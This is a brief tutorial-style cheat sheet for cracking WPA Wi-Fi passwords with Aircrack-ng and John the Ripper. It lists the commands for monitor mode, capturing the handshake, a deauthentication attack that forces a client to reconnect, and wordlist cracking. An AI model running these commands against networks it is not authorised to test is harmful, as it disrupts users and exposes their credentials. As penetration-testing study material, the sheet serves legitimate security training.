AIRCRACK-NG AND JTR ATTACK
Aircrack-ng and JTR Attack
---------------------------

Place your wireless card into monitor mode on the channel number of the AP:

airmon-ng start <interface> <AP channel>

Start an Airodump capture, filtering on the AP channel and BSSID, saving the capture to
disk:

airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>

Force a client to reconnect and complete the 4-way handshake by running a
deauthentication attack against it:

aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>

Once a handshake has been captured, change to the John the Ripper directory and pipe in
the mangled words into Aircrack-ng to obtain the WPA password:

./john --wordlist=<wordlist> --rules --stdout | aircrack-ng -e <ESSID> -w -
<capture>
